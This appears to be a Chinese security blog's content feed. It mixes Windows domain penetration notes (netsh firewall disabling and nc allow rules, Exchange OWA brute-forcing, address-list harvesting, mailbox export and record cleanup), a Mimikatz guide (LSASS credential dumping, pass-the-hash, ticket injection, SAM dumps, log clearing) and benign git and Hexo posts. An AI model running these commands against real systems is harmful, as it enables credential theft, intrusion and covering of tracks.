<h3 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable  			  #winserver2003及之前版本 关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off   #winserver2003之后版本 关闭防火墙</span><br><span class="line">netsh firewall show config #查看防火墙配置</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable  #Windows Server 2003 系统及之前版本，允许指定程序全部连接</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;  				#Windows Server 2003 之后系统版本允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;  				# 允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow   #允许 3389 端口放行</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot; 								#自定义防火墙日志储存位置</span><br></pre></td></tr></table></figure>

<h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此需要exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p>
<h3 id="邮箱用户密码爆破"><a href="#邮箱用户密码爆破" class="headerlink" title="邮箱用户密码爆破"></a>邮箱用户密码爆破</h3><p>使用ruler工具对owa接口进行爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ruler --domain targetdomain.com brute --users /path/to/user.txt --passwords /path/to/passwords.txt</span><br></pre></td></tr></table></figure>

<p>ruler工具会自动搜索owa可以爆破的接口，如：</p>
<p><a href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml</a></p>
<p>其他如ews接口也存在被暴力破解利用的风险：</p>
<p><a href="https://mail.targetdomain.com/ews">https://mail.targetdomain.com/ews</a></p>
<h3 id="通讯录收集"><a href="#通讯录收集" class="headerlink" title="通讯录收集"></a>通讯录收集</h3><p>在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>当我们拿下exchange服务器后，可以做一些信息收集，包括不限于用户、邮件。</p>
<p>获取所有邮箱用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-Mailbox</span><br></pre></td></tr></table></figure>

<p>导出邮件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">New-MailboxexportRequest -mailbox username -FilePath (&quot;\\localhost\c$\test\username.pst&quot;)</span><br></pre></td></tr></table></figure>

<p>也可以通过web口导出，登录：</p>
<p><a href="https://mail.domain.com/ecp/">https://mail.domain.com/ecp/</a></p>
<p>导出后会有记录，用如下命令可以查看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-MailboxExportRequest</span><br></pre></td></tr></table></figure>

<p>删除某个导出记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remove-MailboxExportRequest -Identity &#x27;username\mailboxexport&#x27; -Confirm:$false</span><br></pre></td></tr></table></figure>



<h2 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h2><h2 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h2><p>可以了解，都不推荐使用</p>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>域信息收集</category>
      </categories>
      <tags>
        <tag>-内网渗透 -信息收集 -windows域环境</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/09/14/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>-博客测试</tag>
      </tags>
  </entry>
  <entry>
    <title>git用法小记</title>
    <url>/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
<h2 id="1、常用"><a href="#1、常用" class="headerlink" title="1、常用"></a>1、常用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:yeszao/dofiler.git     # 配置远程git版本库</span><br><span class="line"></span><br><span class="line">git pull origin master                     # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push origin master                     # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git fetch origin                        # 从远程库获取代码</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git branch                           # 显示所有分支</span><br><span class="line"></span><br><span class="line">git checkout master                       # 切换到master分支</span><br><span class="line"></span><br><span class="line">git checkout -b dev                       # 创建并切换到dev分支</span><br><span class="line"></span><br><span class="line">git commit -m &quot;first version&quot;                  # 提交</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git status                           # 查看状态</span><br><span class="line"></span><br><span class="line">git log                             # 查看提交历史</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git config --global core.editor vim               # 设置默认编辑器为vim（git默认用nano）</span><br><span class="line"></span><br><span class="line">git config core.ignorecase false                # 设置大小写敏感</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;YOUR NAME&quot;            # 设置用户名</span><br><span class="line"></span><br><span class="line">git config --global user.email &quot;YOUR EMAIL ADDRESS&quot;       # 设置邮箱</span><br></pre></td></tr></table></figure>



<h2 id="2、别名alias"><a href="#2、别名alias" class="headerlink" title="2、别名alias"></a>2、别名alias</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global alias.br=&quot;branch&quot;                 # 创建/查看本地分支</span><br><span class="line"></span><br><span class="line">git config --global alias.co=&quot;checkout&quot;               # 切换分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cb=&quot;checkout -b&quot;            # 创建并切换到新分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cm=&quot;commit -m&quot;              # 提交</span><br><span class="line"></span><br><span class="line">git config --global alias.st=&quot;status&quot;                 # 查看状态</span><br><span class="line"></span><br><span class="line">git config --global alias.pullm=&quot;pull origin master&quot;  # 拉取分支</span><br><span class="line"></span><br><span class="line">git config --global alias.pushm=&quot;push origin master&quot;  # 提交分支</span><br><span class="line"></span><br><span class="line">git config --global alias.log=&quot;git log --oneline --graph --decorate --color=always&quot; # 单行、分颜色显示记录</span><br><span class="line"></span><br><span class="line">git config --global alias.logg=&quot;git log --graph --all --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold white)— %an%C(reset)%C(bold yellow)%d%C(reset)&#x27; --abbrev-commit --date=relative&quot; # 复杂显示</span><br></pre></td></tr></table></figure>



<h2 id="3、创建版本库"><a href="#3、创建版本库" class="headerlink" title="3、创建版本库"></a>3、创建版本库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone                  # 克隆远程版本库</span><br><span class="line"></span><br><span class="line">git init                        # 初始化本地版本库</span><br></pre></td></tr></table></figure>



<h2 id="4、修改和提交"><a href="#4、修改和提交" class="headerlink" title="4、修改和提交"></a>4、修改和提交</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status                      # 查看状态</span><br><span class="line"></span><br><span class="line">git diff                        # 查看变更内容</span><br><span class="line"></span><br><span class="line">git add .                       # 跟踪所有改动过的文件</span><br><span class="line"></span><br><span class="line">git add                   # 跟踪指定的文件</span><br><span class="line"></span><br><span class="line">git mv               # 文件改名</span><br><span class="line"></span><br><span class="line">git rm                    # 删除文件</span><br><span class="line"></span><br><span class="line">git rm --cached           # 停止跟踪文件但不删除</span><br><span class="line"></span><br><span class="line">git commit -m “commit message”  # 提交所有更新过的文件</span><br><span class="line"></span><br><span class="line">git commit --amend              # 修改最后一次提交</span><br></pre></td></tr></table></figure>



<h2 id="5、查看历史"><a href="#5、查看历史" class="headerlink" title="5、查看历史"></a>5、查看历史</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log                         # 查看提交历史</span><br><span class="line"></span><br><span class="line">git log -p                # 查看指定文件的提交历史</span><br><span class="line"></span><br><span class="line">git blame                 # 以列表方式查看指定文件的提交历史</span><br></pre></td></tr></table></figure>



<h2 id="6、撤销"><a href="#6、撤销" class="headerlink" title="6、撤销"></a>6、撤销</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD           # 撤消工作目录中所有未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git reset --hard       # 撤销到某个特定版本</span><br><span class="line"></span><br><span class="line">git checkout HEAD         # 撤消指定的未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git checkout --           # 同上一个命令</span><br><span class="line"></span><br><span class="line">git revert              # 撤消指定的提交分支与标签</span><br></pre></td></tr></table></figure>



<h2 id="7、分支与标签"><a href="#7、分支与标签" class="headerlink" title="7、分支与标签"></a>7、分支与标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch                      # 显示所有本地分支</span><br><span class="line"></span><br><span class="line">git checkout        # 切换到指定分支或标签</span><br><span class="line"></span><br><span class="line">git branch          # 创建新分支</span><br><span class="line"></span><br><span class="line">git branch -d           # 删除本地分支</span><br><span class="line"></span><br><span class="line">git tag                         # 列出所有本地标签</span><br><span class="line"></span><br><span class="line">git tag                # 基于最新提交创建标签</span><br><span class="line"></span><br><span class="line">git tag -a &quot;v1.0&quot; -m &quot;一些说明&quot;  # -a指定标签名称，-m指定标签说明</span><br><span class="line"></span><br><span class="line">git tag -d             # 删除标签</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git checkout dev                # 合并特定的commit到dev分支上</span><br><span class="line"></span><br><span class="line">git cherry-pick 62ecb3</span><br></pre></td></tr></table></figure>



<h2 id="8、合并与衍合"><a href="#8、合并与衍合" class="headerlink" title="8、合并与衍合"></a>8、合并与衍合</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git merge               # 合并指定分支到当前分支</span><br><span class="line"></span><br><span class="line">git merge --abort               # 取消当前合并，重建合并前状态</span><br><span class="line"></span><br><span class="line">git merge dev -Xtheirs          # 以合并dev分支到当前分支，有冲突则以dev分支为准</span><br><span class="line"></span><br><span class="line">git rebase              # 衍合指定分支到当前分支</span><br></pre></td></tr></table></figure>



<h2 id="9、远程操作"><a href="#9、远程操作" class="headerlink" title="9、远程操作"></a>9、远程操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote -v                   # 查看远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote show         # 查看指定远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote add    # 添加远程版本库</span><br><span class="line"></span><br><span class="line">git remote remove       # 删除指定的远程版本库</span><br><span class="line"></span><br><span class="line">git fetch               # 从远程库获取代码</span><br><span class="line"></span><br><span class="line">git pull       # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push       # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git push : # 删除远程分支或标签</span><br><span class="line"></span><br><span class="line">git push --tags                 # 上传所有标签</span><br></pre></td></tr></table></figure>



<h2 id="10、打包"><a href="#10、打包" class="headerlink" title="10、打包"></a>10、打包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git archive --format=zip --output ../file.zip master    # 将master分支打包成file.zip文件，保存在上一级目录</span><br><span class="line"></span><br><span class="line">git archive --format=zip --output ../v1.2.zip v1.2      # 打包v1.2标签的文件，保存在上一级目录v1.2.zip文件中</span><br><span class="line"></span><br><span class="line">git archive --format=zip v1.2 &gt; ../v1.2.zip             # 作用同上一条命令</span><br></pre></td></tr></table></figure>



<h2 id="11、全局和局部配置"><a href="#11、全局和局部配置" class="headerlink" title="11、全局和局部配置"></a>11、全局和局部配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局配置保存在：$Home/.gitconfig</span><br><span class="line">本地仓库配置保存在：.git/config</span><br></pre></td></tr></table></figure>



<h2 id="12、远程和本地合并"><a href="#12、远程和本地合并" class="headerlink" title="12、远程和本地合并"></a>12、远程和本地合并</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init                              # 初始化本地代码仓</span><br><span class="line"></span><br><span class="line">git add .                             # 添加本地代码</span><br><span class="line"></span><br><span class="line">git commit -m &quot;add local source&quot;      # 提交本地代码</span><br><span class="line"></span><br><span class="line">git pull origin master                # 下载远程代码</span><br><span class="line"></span><br><span class="line">git merge master                      # 合并master分支</span><br><span class="line"></span><br><span class="line">git push -u origin master             # 上传代码</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内功心法</category>
        <category>git命令</category>
      </categories>
      <tags>
        <tag>-git语法 -git仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>Mimikatz使用</title>
    <url>/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>Mimikatz是一款后渗透测试工具，它能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的工具. lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！</p>
<p>注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行</p>
<p>参考文章:<a href="https://cloud.tencent.com/developer/article/1683140">Mimikatz 用法详解 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029161557630.png" class title="image-20211029161557630">









<h2 id="privilege"><a href="#privilege" class="headerlink" title="privilege"></a>privilege</h2><hr>
<p>通过id来确定权限 ，debug是20，driver是 10</p>
<h3 id="privilege-debug"><a href="#privilege-debug" class="headerlink" title="privilege::debug"></a>privilege::debug</h3><p>提升为debug权限，id转换为20</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028180907459.png" class title="image-20211028180907459">



<h3 id="privilege-id-number"><a href="#privilege-id-number" class="headerlink" title="privilege::id  $number$"></a>privilege::id  $number$</h3><p>id值在1到 20之间</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028181549132.png" class title="image-20211028181549132">



<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><hr>
<p>导出未标记为可导出的 证书。一般私钥会被标记为不可导出，使用这个参数可以给系统打patch，之后就可以导出了</p>
<h3 id="crypto-providers"><a href="#crypto-providers" class="headerlink" title="crypto::providers"></a>crypto::providers</h3><p>查看加密 提供者。 一般有 CryptoAPI和 CNG 两种，其重CNG较为古老</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028183434518.png" class title="image-20211028183434518">



<h3 id="crypto-stores"><a href="#crypto-stores" class="headerlink" title="crypto::stores"></a>crypto::stores</h3><p>证书存储。windows 系统中有很多证书存储，默认的是CURRENT_USER 这个证书存储。</p>
<p>可以通过查询证书存储子下的所有存储证书</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crypto::stores /systemstore::证书存储名称</span><br></pre></td></tr></table></figure>

<p>比如local_machine证书存储,</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028192253999.png" class title="image-20211028192253999">



<h3 id="crypto-certificates"><a href="#crypto-certificates" class="headerlink" title="crypto::certificates"></a>crypto::certificates</h3><p>查看子存储存在的证书(默认为系统存储Current_User下的子存储MY)</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028193029086.png" class title="image-20211028193029086">



<h4 id="查询证书"><a href="#查询证书" class="headerlink" title="查询证书"></a>查询证书</h4><p>后面跟着&#x2F;store:子存储证书名称(当前证书存储位置是由前一个命令获取存储证书位置来决定的)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crypto:certificates /store:Root(子存储位置)</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028193345511.png" class title="image-20211028193345511">



<h4 id="导出证书"><a href="#导出证书" class="headerlink" title="导出证书"></a>导出证书</h4><p>Mimikatz不仅可以查询证书，还能将数据库中的证书导出(在Mimikatz目录下保存)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crypto::certificates/store:Root(子存储) /export</span><br></pre></td></tr></table></figure>

<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028194234708.png" class title="image-20211028194234708">



<p>导出的公钥是DER格式的，私钥是PFX格式的，密码是mimikatz</p>
<h3 id="cypto-capi"><a href="#cypto-capi" class="headerlink" title="cypto::capi"></a>cypto::capi</h3><p>可以使用该命令给CryptoAPI打补丁，然后就支持CryptoAPI导出</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028194531013.png" class title="image-20211028194531013">



<h3 id="crypto-cng"><a href="#crypto-cng" class="headerlink" title="crypto::cng"></a>crypto::cng</h3><p>打cng补丁</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028203725366.png" class title="image-20211028203725366">



<h3 id="crypto-sc"><a href="#crypto-sc" class="headerlink" title="crypto::sc"></a>crypto::sc</h3><p>列出智能读卡器</p>
<h3 id="crypto-keys"><a href="#crypto-keys" class="headerlink" title="crypto::keys"></a>crypto::keys</h3><p>读取密钥，会列举出CryptoAPI和CNG密钥</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028204138319.png" class title="image-20211028204138319">



<p>可以看到有三个子选项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Provider</span><br><span class="line"></span><br><span class="line">Provider type</span><br><span class="line"></span><br><span class="line">CNG Provider</span><br></pre></td></tr></table></figure>

<p>使用&#x2F;provider查看所有用户的密钥</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028210116946.png" class title="image-20211028210116946">



<p>使用&#x2F;export导出密钥，PVK files这个格式并不是我们平常的pem 格式，我们需要进一步转换</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211028212205333.png" class title="image-20211028212205333">



<p>转化命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa –inform pvk –in key.pvk–outform pem –out key.pem</span><br></pre></td></tr></table></figure>



<h2 id="sekurlsa"><a href="#sekurlsa" class="headerlink" title="sekurlsa"></a>sekurlsa</h2><hr>
<p>从lsass进程中提取passwords、keys、pin、tickets等信息</p>
<p>注意，既然是从内存中读取，那么就不会去SAM<a href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>读取，所以SAM数据库临时改动，只要内存中没有，那就读取不到</p>
<p>有如下命令:</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029103412193.png" class title="image-20211029103412193">



<h3 id="sekurlsa-msv"><a href="#sekurlsa-msv" class="headerlink" title="sekurlsa::msv"></a>sekurlsa::msv</h3><p>获取主机Hash值</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029105750418.png" class title="image-20211029105750418">



<h3 id="sekurlsa-wdigest"><a href="#sekurlsa-wdigest" class="headerlink" title="sekurlsa::wdigest"></a>sekurlsa::wdigest</h3><p>通过可逆的方式去读取明文密码</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110012570.png" class title="image-20211029110012570">



<h3 id="sekurlsa-Kerberos"><a href="#sekurlsa-Kerberos" class="headerlink" title="sekurlsa::Kerberos"></a>sekurlsa::Kerberos</h3><p>假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110051172.png" class title="image-20211029110051172">



<h3 id="sekurlsa-tspkg"><a href="#sekurlsa-tspkg" class="headerlink" title="sekurlsa::tspkg"></a>sekurlsa::tspkg</h3><p>通过tspkg读取明文密码</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110121290.png" class title="image-20211029110121290">



<h3 id="sekurlsa-livessp"><a href="#sekurlsa-livessp" class="headerlink" title="sekurlsa::livessp"></a>sekurlsa::livessp</h3><p>通过livessp读取明文密码</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029110148645.png" class title="image-20211029110148645">



<h3 id="sekurlsa-logonPasswords"><a href="#sekurlsa-logonPasswords" class="headerlink" title="sekurlsa::logonPasswords"></a>sekurlsa::logonPasswords</h3><p>通过以上各种方式读取明文密码</p>
<h3 id="sekurlsa-pth"><a href="#sekurlsa-pth" class="headerlink" title="sekurlsa::pth"></a>sekurlsa::pth</h3><p>可以直接用hash来进行登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx</span><br></pre></td></tr></table></figure>

<p>其中&#x2F;domain 如果加入了域，那就填写域名，如果没有，那就写计算机名,执行后会在本地新开一个以hash身份的命令行窗口</p>
<h2 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h2><hr>
<p>与kerberos协议攻击相关的模块</p>
<h3 id="kerberos-ptt"><a href="#kerberos-ptt" class="headerlink" title="kerberos::ptt"></a>kerberos::ptt</h3><p>将票据注入内存。票证传递。通常用于注入窃取或伪造的 Kerberos 票证（黄金票证&#x2F;白银票证&#x2F;信任票证）</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031234932540.png" class title="image-20211031234932540">



<h3 id="kerberos-list"><a href="#kerberos-list" class="headerlink" title="kerberos::list"></a>kerberos::list</h3><p>列出所有的ticket票据</p>
<h3 id="Kerberos-tgt"><a href="#Kerberos-tgt" class="headerlink" title="Kerberos::tgt"></a>Kerberos::tgt</h3><p>获取主机上的票据认证票据</p>
<h3 id="kerberos-purge"><a href="#kerberos-purge" class="headerlink" title="kerberos:;purge"></a>kerberos:;purge</h3><p>清除内存中的票据</p>
<h3 id="kerberos-golden"><a href="#kerberos-golden" class="headerlink" title="kerberos::golden"></a>kerberos::golden</h3><p>获取主机上的黄金票据</p>
<h3 id="kerberos-hash"><a href="#kerberos-hash" class="headerlink" title="kerberos::hash"></a>kerberos::hash</h3><p>获取主机上所有Hash密钥</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031163020991.png" class title="image-20211031163020991">



<h3 id="kerberos-clist"><a href="#kerberos-clist" class="headerlink" title="kerberos::clist"></a>kerberos::clist</h3><h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><hr>
<h3 id="process-list"><a href="#process-list" class="headerlink" title="process::list"></a>process::list</h3><p>列出进程列表</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029114318168.png" class title="image-20211029114318168">



<p>process::exports</p>
<p>导入进程</p>
<p>process::imports</p>
<p>导出进程</p>
<h3 id="process-start"><a href="#process-start" class="headerlink" title="process::start"></a>process::start</h3><p>开始一个进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">process:start [/paused]  [/sudo] commande</span><br></pre></td></tr></table></figure>



<h3 id="process-stop"><a href="#process-stop" class="headerlink" title="process::stop"></a>process::stop</h3><p>暂停一个程序</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029114951284.png" class title="image-20211029114951284">



<h3 id="process-suspend"><a href="#process-suspend" class="headerlink" title="process::suspend"></a>process::suspend</h3><p>冻结一个进程</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029114900875.png" class title="image-20211029114900875">



<h3 id="process-resume"><a href="#process-resume" class="headerlink" title="process::resume"></a>process::resume</h3><p>从冻结中恢复</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029115017551.png" class title="image-20211029115017551">



<h3 id="process-run"><a href="#process-run" class="headerlink" title="process::run"></a>process::run</h3><p>运行进程</p>
<h3 id="process-runp"><a href="#process-runp" class="headerlink" title="process::runp"></a>process::runp</h3><p>查看mimikatz使用的模块</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029161425608.png" class title="image-20211029161425608">



<h2 id="lsadump"><a href="#lsadump" class="headerlink" title="lsadump"></a>lsadump</h2><hr>
<p>通过查询SAM数据库来读取HASH</p>
<h3 id="lsadump-sam"><a href="#lsadump-sam" class="headerlink" title="lsadump::sam"></a>lsadump::sam</h3><p>导出SAM的Hash值</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211029161746800.png" class title="image-20211029161746800">



<h3 id="lsamdump-setntlm"><a href="#lsamdump-setntlm" class="headerlink" title="lsamdump::setntlm"></a>lsamdump::setntlm</h3><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>列出服务管理</p>
<h3 id="service-list"><a href="#service-list" class="headerlink" title="service::list"></a>service::list</h3><p>列出当前服务</p>
<h3 id="service-1"><a href="#service-1" class="headerlink" title="service::+"></a>service::+</h3><p>mimikatz 将自己注册为一个系统服务，这样每次系统起来就会自动运行了</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031154423172.png" class title="image-20211031154423172">



<h3 id="service-2"><a href="#service-2" class="headerlink" title="service::-"></a>service::-</h3><p>停止并删除mimikatzsvc服务</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031154526142.png" class title="image-20211031154526142">





<h2 id="ts"><a href="#ts" class="headerlink" title="ts"></a>ts</h2><hr>
<p>终端服务 terminal service</p>
<h3 id="ts-multirdp"><a href="#ts-multirdp" class="headerlink" title="ts::multirdp"></a>ts::multirdp</h3><p>默认非服务器系统，windows只允许一个用户登录，也就是说如果我让别人远程登录我的电脑，那么我就不能操作了</p>
<p>这个命令可以让其支持多个用户同时在线</p>
<h3 id="ts-sessions"><a href="#ts-sessions" class="headerlink" title="ts::sessions"></a>ts::sessions</h3><p>可以查看当前登录用户的登录信息</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031154750092.png" class title="image-20211031154750092">

<p>可以看到当前的登录sessions的相关信息，并且每个session都有编号。可以看到Session的状态，登录用户，连接登录时间等会话相关信息。</p>
<h3 id="ts-remote-x2F-id-1"><a href="#ts-remote-x2F-id-1" class="headerlink" title="ts::remote &#x2F;id:1"></a>ts::remote &#x2F;id:1</h3><p>此时会跳出当前用户的账号，在主界面可以看到session为1的那个账号的已经登录了，我们输入密码可以看到他的登录信息，比如他在打开哪些文件</p>
<img src="/2021/11/01/mimikatz%E4%BD%BF%E7%94%A8/image-20211031155311474.png" class title="image-20211031155311474">



<h2 id="event"><a href="#event" class="headerlink" title="event"></a>event</h2><hr>
<p>关于日志的操作，比如清空安全日志中的所有日志</p>
